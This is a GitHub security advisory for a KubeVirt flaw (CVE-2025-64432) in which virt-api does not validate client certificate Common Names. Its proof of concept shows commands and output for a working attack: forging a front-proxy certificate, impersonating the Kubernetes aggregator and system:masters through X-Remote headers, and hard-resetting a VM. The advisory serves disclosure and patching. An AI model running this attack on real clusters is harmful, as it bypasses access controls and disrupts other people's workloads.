# [M] KubeVirt Affected by an Authentication Bypass in Kubernetes Aggregation Layer 

## Summary
Severity: Medium
Advisory: GHSA-38jw-g2qx-4286
CVE: CVE-2025-64432
CWE: CWE-287, CWE-295
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2025-11-06
Source: https://github.com/advisories/GHSA-38jw-g2qx-4286
Type: github-advisory

## Affected
- Go: `kubevirt.io/kubevirt` — affected >=0 <1.5.3
- Go: `kubevirt.io/kubevirt` — affected >=1.6.0-alpha.0 <1.6.1
- Go: `kubevirt.io/kubevirt` — affected >=1.7.0-alpha.0 <1.7.0-rc.0

## Details
### Summary
_Short summary of the problem. Make the impact and severity as clear as possible.

A flawed implementation of the Kubernetes aggregation layer's authentication flow could enable bypassing RBAC controls.

### Details
_Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._

It was discovered that the `virt-api` component fails to correctly authenticate the client when receiving API requests over mTLS. In particular, it fails to validate the CN (Common Name) field in the received client TLS certificates against the set of allowed values defined in the `extension-apiserver-authentication` configmap. 

The Kubernetes API server proxies received client requests through a component called aggregator (part of K8S's API server), and authenticates to the `virt-api` server using a certificate signed by the CA specified via the `--requestheader-client-ca-file` CLI flag. This CA bundle is primarily used in the context of aggregated API servers, where the Kubernetes API server acts as a trusted front-end proxy forwarding requests.

While this is the most common use case, the same CA bundle can also support less common scenarios, such as issuing certificates to [authenticating](how-kubernetes-certificates-work) front-end [proxies](https://deepwiki.com/kubernetes/apiserver/7.1-authentication#request-header-authentication). These proxies can be deployed by organizations to extend Kubernetes' native authentication mechanisms or to integrate with existing identity systems (e.g., LDAP, OAuth2, SSO platforms). In such cases, the Kubernetes API server can trust these external proxies as legitimate authenticators, provided their client certificates are signed by the same CA as the one defined via `--requestheader-client-ca-file`.
Nevertheless, these external authentication proxies are not supposed to directly communicate with aggregated API servers.

Thus, by failing to validate the CN field in the client TLS certificate, the `virt-api` component may allow an attacker to bypass existing RBAC controls by directly communicating with the aggregated API server, impersonating the Kubernetes API server and its aggregator component.

However, two key prerequisites must be met for successful exploitation:

- The attacker must possess a valid front-end proxy certificate signed by the trusted CA (`requestheader-client-ca-file`). For example, they can steal the certificate material by compromising a front-end proxy or they could obtain a bundle by exploiting a poorly configured and managed PKI system.

- The attacker must have network access to the `virt-api` service, such as via a compromised or controlled pod within the cluster.

These conditions significantly reduce the likelihood of exploitation. In addition, the `virt-api` component **acts as a sub-resource server**, meaning it only handles requests for specific resources and sub-resources . The handled by it requests are mostly related to the lifecycle of already existing resources.

Nonetheless, if met, the vulnerability could be exploited by a *Pod-Level Attacker* to escalate privileges, and manipulate existing virtual machine workloads potentially leading to violation of their CIA (Confidentiality, Integrity and Availability).

### PoC
_Complete instructions, including specific configuration details, to reproduce the vulnerability._

#### Bypassing authentication

In this section, it is demonstrated how an attacker could use a certificate with a different CN field to bypass the authentication of the aggregation layer and perform arbitrary API sub-resource requests to the `virt-api` server.

The `kube-apiserver` has been launched with the following CLI flags:


```bash
admin@minikube:~$ kubectl -n kube-system describe pod kube-apiserver-minikube | grep Command -A 28
    Command:
      kube-apiserver
      --advertise-address=192.168.49.2
      --allow-privileged=true
      --authorization-mode=Node,RBAC
      --client-ca-file=/var/lib/minikube/certs/ca.crt
      --enable-admission-plugins=NamespaceLifecycle,LimitRanger,ServiceAccount,DefaultStorageClass,DefaultTolerationSeconds,NodeRestriction,MutatingAdmissionWebhook,ValidatingAdmissionWebhook,ResourceQuota
      --enable-bootstrap-token-auth=true
      --etcd-cafile=/var/lib/minikube/certs/etcd/ca.crt
      --etcd-certfile=/var/lib/minikube/certs/apiserver-etcd-client.crt
      --etcd-keyfile=/var/lib/minikube/certs/apiserver-etcd-client.key
      --etcd-servers=https://127.0.0.1:2379
      --kubelet-client-certificate=/var/lib/minikube/certs/apiserver-kubelet-client.crt
      --kubelet-client-key=/var/lib/minikube/certs/apiserver-kubelet-client.key
      --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname
      --proxy-client-cert-file=/var/lib/minikube/certs/front-proxy-client.crt
      --proxy-client-key-file=/var/lib/minikube/certs/front-proxy-client.key
      --requestheader-allowed-names=front-proxy-client
      --requestheader-client-ca-file=/var/lib/minikube/certs/front-proxy-ca.crt
      --requestheader-extra-headers-prefix=X-Remote-Extra-
      --requestheader-group-headers=X-Remote-Group
      --requestheader-username-headers=X-Remote-User
      --secure-port=8443
      --service-account-issuer=https://kubernetes.default.svc.cluster.local
      --service-account-key-file=/var/lib/minikube/certs/sa.pub
      --service-account-signing-key-file=/var/lib/minikube/certs/sa.key
      --service-cluster-ip-range=10.96.0.0/12
      --tls-cert-file=/var/lib/minikube/certs/apiserver.crt
      --tls-private-key-file=/var/lib/minikube/certs/apiserver.key
```

By default, Minikube generates a self-signed CA certificate (`var/lib/minikube/certs/front-proxy-ca.crt`) and use it to sign the certificate used by the aggregator (`/var/lib/minikube/certs/front-proxy-client.crt`):

```bash
# inspect the self-signed front-proxy-ca certificate
admin@minikube:~$ openssl x509 -text -in  /var/lib/minikube/certs/front-proxy-ca.crt | grep -e "Issuer:" -e "Subject:"
        Issuer: CN = front-proxy-ca
        Subject: CN = front-proxy-ca
# inspect the front-proxy-client certificate signed with the above cert
$ openssl x509 -text -in  /var/lib/minikube/certs/front-proxy-client.crt | grep -e "Issuer:" -e "Subject:"
        Issuer: CN = front-proxy-ca
        Subject: CN = front-proxy-client
```


One can also inspect the contents of the `extension-apiserver-authentication` ConfigMap which is used as a trust anchor by all extension API servers:

```bash
admin@minikube:~$ kubectl -n kube-system describe configmap extension-apiserver-authentication
Name:         extension-apiserver-authentication
Namespace:    kube-system
Labels:       <none>
Annotations:  <none>

Data
====
requestheader-client-ca-file:
----
-----BEGIN CERTIFICATE-----
MIIDETCCAfmgAwIBAgIIN59KhbrmeJkwDQYJKoZIhvcNAQELBQAwGTEXMBUGA1UE
AxMOZnJvbnQtcHJveHktY2EwHhcNMjUwNTE4MTQzMTI3WhcNMzUwNTE2MTQzNjI3
WjAZMRcwFQYDVQQDEw5mcm9udC1wcm94eS1jYTCCASIwDQYJKoZIhvcNAQEBBQAD
ggEPADCCAQoCggEBALOFlqbM1h3uhTdU9XBZQ6AX8S7M0nT5SgSOSItJrVwjNUv/
t4FAQxnGPW7fhp9A9CeQ92DGLXkm88fgHCgnPJuodKgX8fS7NHfswvXKkgo6C4UO
2AmW0NAkuKMyTmf1tWugot7hj3sGFfIzVSLL73wm1Ci8unTaGKZG01ZZalL1kzz9
ObpmEn7DQvSJd7m5gALP4KPJdkFjoagMI4UlIownARl0h2DX5WAKy0ynGfEBvw+P
hEbuVPb+egeUVTn9/4JIqdUw21tUQrmbQqPib8BByueiOYqEerGxZDpLAxh230VG
Q6omoyUHjE6SIMBoUnAqAdLbTElVbLWJawlLZzECAwEAAaNdMFswDgYDVR0PAQH/
BAQDAgKkMA8GA1UdEwEB/wQFMAMBAf8wHQYDVR0OBBYEFPjiIeJVR7zQBCkpmkEa
I+70PxA8MBkGA1UdEQQSMBCCDmZyb250LXByb3h5LWNhMA0GCSqGSIb3DQEBCwUA
A4IBAQBiNTe9Sdv9RnKqTyt+Xj0NJrScVOiWPb9noO5XSyBtOy8F8b+ZWAtzc+eI
G/g6hpiT7lq3hVtmDNiE6nsP3tywXf0mgg7blRC0l3DxGtSzJZlbahAI4/U5yen7
orKiWiD/ObK2rGbt1toVRyvJzPi3hYjh4mA6GMyFbOC6snopNyM9oj+b/EuTCavf
l9WTNn2ZZQ1nYfJsLjOY5k/VtpZw1D/QwYt0u/A83RxEeBvK2aZPsq/nA0jqeHhe
VHauDQslkjMw0yrFc1b+Ju4Ly+BwH+Mi7ALUINc8EVncWZyM2L7B4N9XwPSp6YPX
fZnj69fu0JWfrq88M+LnKOyfkqi4
-----END CERTIFICATE-----


requestheader-extra-headers-prefix:
----
["X-Remote-Extra-"]

requestheader-group-headers:
----
["X-Remote-Group"]

requestheader-username-headers:
----
["X-Remote-User"]

client-ca-file:
----
-----BEGIN CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
a3ViZUNBMB4XDTI1MDQxMTE3MzM1N1oXDTM1MDQxMDE3MzM1N1owFTETMBEGA1UE
AxMKbWluaWt1YmVDQTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALXK
ShgBkCDLETxDOSknvWHr7lfnvLtSCLf3VPVwFQNDhLAuFBc2H1MSMqzW6hcyxAVA
arQbOe36zxHjHpaP3VlGOEw3CVesPNw6ZToGuhpRq1inQATzeg2yc5w1jtRjLXhb
BWp7zCDk1qoHws/fWpaWOe3oQq4ZOA1+bJDsmZ7LjmMtOKHdqftEFz/RGVrn7nKD
/WXyGgKgSSNFsDK+Ow6gN6r3b10S82VQ5MwncJuqGO1r036yjwWBU8PEpknc/MhG
J/bMdI/w49rxlEAE92OadYRNvC0SDhG0HyPj9BMVx8ZG5X28lZMgq98UzVgu9Try
e8tndHqxUaU7rjO7j/8CAwEAAaNhMF8wDgYDVR0PAQH/BAQDAgKkMB0GA1UdJQQW
MBQGCCsGAQUFBwMCBggrBgEFBQcDATAPBgNVHRMBAf8EBTADAQH/MB0GA1UdDgQW
BBS8FpfTfvGkXDPJEXUoTQs+MwVhPjANBgkqhkiG9w0BAQsFAAOCAQEAFg+gxZ7W
zZValzuoXSc3keutB4U0QXFzjOhTVo8D/qsBNkxasdsrYjF2Do/KuGxCefXRZbTe
QWX3OFhiiabd0nkGoNTxXoPqwOJHczk+bo8L2Vcva1JAi/tBVNkPULzZilZWgWQz
8d8NgABP7MpHnOJVvAr6BEaS1wpoLzyEMXm6YToZXjDX1ajzyyLonQ9So1Y7aj6v
yPQ8OO2TUhkEpzb28/s5Pr33QT8W0/FX3m8+MGSNvWdHNZ+UzXLk3iSfySgjmciZ
o4C5yKLZgKFxoFBxY25emr6QDZW+3HicZj6sPsblGlvlBF5wQgF65msgjvmRfTLq
JPwzd6yDCMUuZQ==
-----END CERTIFICATE-----


requestheader-allowed-names:
----
["front-proxy-client"]


BinaryData
====

Events:  <none>
```

It is assumed that an attacker has obtained access to a Kubernetes pod and could communicate with `virt-api` reachable at `10.244.0.6`.

```bash
root@compromised-pod:~$ curl -ks https://10.244.0.6:8443/ | jq .
{
  "paths": [
    "/apis",
    "/openapi/v2",
    "/apis/subresources.kubevirt.io",
    "/apis/subresources.kubevirt.io/v1",
    "/apis/subresources.kubevirt.io",
    "/apis/subresources.kubevirt.io/v1alpha3"
  ]
}
```

The `virt-api` service has two types of endpoints -- authenticated and non-authenticated:

```go
// pkg/authorizer/authorizer.go

var noAuthEndpoints = map[string]struct{}{
	"/":           {},
	"/apis":       {},
	"/healthz":    {},
	"/openapi/v2": {},
	// Although KubeVirt does not publish v3, Kubernetes aggregator controller will
	// handle v2 to v3 (lossy) conversion if KubeVirt returns 404 on this endpoint
	"/openapi/v3": {},
	// The endpoints with just the version are needed for api aggregation discovery
	// Test with e.g. kubectl get --raw /apis/subresources.kubevirt.io/v1
	"/apis/subresources.kubevirt.io/v1":               {},
	"/apis/subresources.kubevirt.io/v1/version":       {},
	"/apis/subresources.kubevirt.io/v1/guestfs":       {},
	"/apis/subresources.kubevirt.io/v1/healthz":       {},
	"/apis/subresources.kubevirt.io/v1alpha3":         {},
	"/apis/subresources.kubevirt.io/v1alpha3/version": {},
	"/apis/subresources.kubevirt.io/v1alpha3/guestfs": {},
	"/apis/subresources.kubevirt.io/v1alpha3/healthz": {},
	// the profiler endpoints are blocked by a feature gate
	// to restrict the usage to development environments
	"/start-profiler": {},
	"/stop-profiler":  {},
	"/dump-profiler":  {},
	"/apis/subresources.kubevirt.io/v1/start-cluster-profiler":       {},
	"/apis/subresources.kubevirt.io/v1/stop-cluster-profiler":        {},
	"/apis/subresources.kubevirt.io/v1/dump-cluster-profiler":        {},
	"/apis/subresources.kubevirt.io/v1alpha3/start-cluster-profiler": {},
	"/apis/subresources.kubevirt.io/v1alpha3/stop-cluster-profiler":  {},
	"/apis/subresources.kubevirt.io/v1alpha3/dump-cluster-profiler":  {},
}
```

Each endpoint which is not in this list is considered an authenticated endpoint and requires a valid client certificate to be presented by the caller.

```bash
# trying to reach an API endpoint not in the above list would require client authentication
attacker@compromised-pod:~$ curl -ks https://10.244.0.6:8443/v1
request is not authenticated
```

To illustrate the vulnerability and attack scenario, below is generated a certificate signed by the `front-proxy-ca` but issued to an entity which is different than `front-proxy-client` (i.e the certificate has a different CN). Later on, it is assumed that the attacker has obtained access to the certificate bundle:

```bash
attacker@compromised-pod:~$ openssl ecparam -genkey -name prime256v1 -noout -out rogue-front-proxy.key
attacker@compromised-pod:~$ openssl req -new -key rogue-front-proxy.key -out rogue-front-proxy.csr -subj "/CN=crypt0n1t3/O=Quarkslab/C=Fr"
attacker@compromised-pod:~$ openssl x509 -req -in rogue-front-proxy.csr -CA front-proxy-ca.crt -CAkey front-proxy-ca.key -CAcreateserial -out
 rogue-front-proxy.crt -days 365
```
The authentication will now succeed:

```bash
attacker@compromised-pod:~$ curl -ks --cert rogue-front-proxy.crt --key rogue-front-proxy.key  https://10.244.0.6:8443/v1
a valid user header is required for authorization
```

To fully exploit the vulnerability, the attacker must also provide valid authentication HTTP headers:

```bash
attacker@compromised-pod:~$ curl -ks --cert rogue-front-proxy.crt --key rogue-front-proxy.key  -H 'X-Remote-User:system:kube-aggregator' -H '
X-Remote-Group: system:masters' https://10.244.0.6:8443/v1
unknown api endpoint: /subresource.kubevirt.io/v1
```

The `virt-api` is a sub-resource extension server - it handles only requests for specific resources and sub-resources (requests having URIs prefixed with `/apis/subresources.kubevirt.io/v1/`). In reality, most of the requests that it accepts are actually executed by the `virt-handler` component and are related to the lifecycle of a VM. 

Hence, `virt-handler`'s API can be seen as aggregated within `virt-api`'s API which in turn transforms it into a proxy. 

The endpoints which are handled by `virt-api` are listed in the Swagger definitions available on GitHub @openapi-spec.

#### Resetting a Virtual Machine Instance 

Consider the following deployed `VirtualMachineInstance` (VMI) within the default namespace:

```yaml
apiVersion: kubevirt.io/v1
kind: VirtualMachineInstance
metadata:
  namespace: default
  name: mishandling-common-name-in-certificate-default
spec:
  domain:
    devices:
      disks:
      - name: containerdisk
        disk:
          bus: virtio

      - name: cloudinitdisk
        disk:
          bus: virtio
    resources:
      requests:
        memory: 1024M
  terminationGracePeriodSeconds: 0
  volumes:
  - name: containerdisk
    containerDisk:
      image: quay.io/kubevirt/cirros-container-disk-demo
  - name: cloudinitdisk      
    cloudInitNoCloud:
      userDataBase64: SGkuXG4=
```

An attacker with a stolen external authentication proxy certificate could easily reset (hard reboot), freeze, or remove volumes from the virtual machine.

```bash
root@compromised-pod:~$ curl -ki --cert rogue-front-proxy.crt --key rogue-front-proxy.key  -H 'X-Remote-User: system:kube-aggregator' -H 'X-Remote-Group: system:masters' https://10.244.0.6:8443/apis/subresources.kubevirt.io/v1/namespaces/default/virtualmachineinstances/mishandling-common-name-in-certificate-default/reset -XPUT

HTTP/1.1 200 OK
Date: Sun, 18 May 2025 16:43:26 GMT
Content-Length: 0
```


### Impact
_What kind of vulnerability is it? Who is impacted?_

The `virt-api` component may allow an attacker to bypass existing RBAC controls by directly communicating with the aggregated API server, impersonating the Kubernetes API server and its aggregator component.

## References
- https://github.com/kubevirt/kubevirt/security/advisories/GHSA-38jw-g2qx-4286
- https://nvd.nist.gov/vuln/detail/CVE-2025-64432
- https://github.com/kubevirt/kubevirt/commit/231dc69723f331dc02f65a31ab4c3d6869f40d6a
- https://github.com/kubevirt/kubevirt/commit/af2f08a9a186eccc650f87c30ab3e07b669e8b5b
- https://github.com/kubevirt/kubevirt/commit/b9773bc588e6e18ece896a2dad5336ef7a653074
- https://github.com/kubevirt/kubevirt
